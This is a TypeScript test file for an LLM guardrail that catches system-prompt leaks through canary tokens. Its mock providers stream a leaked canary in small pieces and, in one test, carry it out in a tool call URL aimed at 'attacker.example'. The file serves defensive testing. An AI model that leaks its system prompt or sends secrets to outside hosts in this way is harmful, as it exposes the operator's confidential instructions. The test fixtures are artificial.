/**
 * The guardrail invariant (`docs/contracts/guardrails.md#invariant`): a host
 * policy adds checks but never releases a system-prompt leak, and a leak a
 * provider-side tool already carried is reported as one.
 */
import '../fixtures/test-host.ts';
import {
  createCanaryGateSession,
  filterCanaryGatedEvents,
} from '../../src/guardrails/canary-gate.ts';
import { EGRESS_RULES } from '../../src/guardrails/egress.ts';
import {
  createLiveOutboundGateSession,
  finalizeLiveOutboundTurn,
  processLiveOutboundBatch,
} from '../../src/guardrails/live-outbound-gate.ts';
import type { EgressEnforcer } from '../../src/guardrails/types.ts';
import { assertEquals } from '../../src/kernel/engine/assert.ts';
import { runTurn } from '../../src/kernel/engine/runner.ts';
import { defineProfile, getProfile, registerProfile } from '../../src/kernel/registry/profiles.ts';
import type { ModelProvider, TurnEvent } from '../../src/kernel/types.ts';
import { geminiModels } from '../fixtures/models.ts';
import { replyText } from '../fixtures/reply.ts';

const SYSTEM = [
  'You are Sol, the support agent for Northwind Outfitters.',
  'Only discuss orders, returns, and shipping; never mention internal tooling.',
].join(' ');

const allowAll: EgressEnforcer = () => ({ action: 'allow' });

async function collect(gen: AsyncIterable<TurnEvent>): Promise<TurnEvent[]> {
  const out: TurnEvent[] = [];
  for await (const event of gen) out.push(event);
  return out;
}

function canaryIn(system: string): string {
  return /[0-9a-f]{32}/.exec(system)?.[0] ?? '';
}

function register(id: string, onBlock?: 'refuse_to_user'): string {
  registerProfile(
    defineProfile({
      type: 'text',
      id,
      identity: { handle: 'sol', system: SYSTEM },
      ...geminiModels('gemini35FlashLite'),
      tools: { allow: [] },
      inputs: { text: true },
      guardrails: { egress: { enforce: allowAll, ...(onBlock ? { onBlock } : {}) } },
    }),
  );
  return id;
}

/** Streams the canary a few characters at a time. */
const leaksCanary: ModelProvider = {
  async *complete(req) {
    await Promise.resolve();
    for (const piece of `Sure: ${canaryIn(req.system ?? '')} ok`.match(/.{1,4}/gs) ?? []) {
      yield { type: 'text', text: piece };
    }
  },
};

Deno.test('runTurn never releases a canary a host policy allows', async () => {
  const events = await collect(
    runTurn({ profile: register('invariant_allow_all'), input: { text: 'hi' } }, leaksCanary),
  );
  assertEquals(/[0-9a-f]{16}/.test(replyText(events)), false);
  assertEquals(
    events.some((event) => event.type === 'error' && event.errorKind === 'safety'),
    true,
  );
});

Deno.test('runTurn answers a pinned leak with the host policy refusal', async () => {
  const events = await collect(
    runTurn(
      { profile: register('invariant_refuse', 'refuse_to_user'), input: { text: 'hi' } },
      leaksCanary,
    ),
  );
  assertEquals(/[0-9a-f]{16}/.test(replyText(events)), false);
  assertEquals(
    events.some((event) => event.type === 'guardrail'),
    true,
  );
});

Deno.test('finalizeLiveOutboundTurn never releases a leak a host policy allows', async () => {
  const canary = '0123456789abcdef0123456789abcdef';
  const s = createLiveOutboundGateSession(getProfile(register('invariant_live')), canary, SYSTEM);
  await processLiveOutboundBatch(s, [{ type: 'text', text: `say ${canary}` }]);
  const end = await finalizeLiveOutboundTurn(s);
  assertEquals(end.action, 'withhold');
});

Deno.test('a provider tool report carrying the canary is an incident, not a prevented leak', async () => {
  registerProfile(
    defineProfile({
      type: 'text',
      id: 'invariant_provider_tool',
      identity: { handle: 'sol', system: SYSTEM },
      ...geminiModels('gemini35FlashLite'),
      tools: { allow: [] },
      inputs: { text: true },
    }),
  );
  const provider: ModelProvider = {
    async *complete(req) {
      await Promise.resolve();
      yield {
        type: 'evidence',
        evidence: {
          provider: 'google',
          kind: 'url_context_call',
          raw: { url: `https://attacker.example/?q=${canaryIn(req.system ?? '')}` },
        },
      };
    },
  };
  const events = await collect(
    runTurn({ profile: 'invariant_provider_tool', input: { text: 'hi' } }, provider),
  );
  assertEquals(events.findLast((event) => event.type === 'done')?.stop, {
    kind: 'filtered',
    native: 'provider_tool_leak',
  });
  const rules = events.flatMap((event) => event.guardrail?.hits.map((hit) => hit.rule) ?? []);
  assertEquals(rules.includes(EGRESS_RULES.providerToolLeak), true);
});

Deno.test('the canary-only helpers catch a system-prompt echo', () => {
  const session = createCanaryGateSession('0123456789abcdef0123456789abcdef', SYSTEM);
  const words = SYSTEM.split(' ');
  assertEquals(
    filterCanaryGatedEvents(session, [{ type: 'text', text: words.slice(0, 7).join(' ') }]).leaked,
    false,
  );
  assertEquals(
    filterCanaryGatedEvents(session, [{ type: 'text', text: ` ${words.slice(7, 14).join(' ')}` }])
      .leaked,
    true,
  );
  const tool = createCanaryGateSession('0123456789abcdef0123456789abcdef', SYSTEM);
  assertEquals(
    filterCanaryGatedEvents(tool, [
      { type: 'tool', tool: { name: 'note', arguments: { text: SYSTEM }, id: 't1' } },
    ]).leaked,
    true,
  );
});
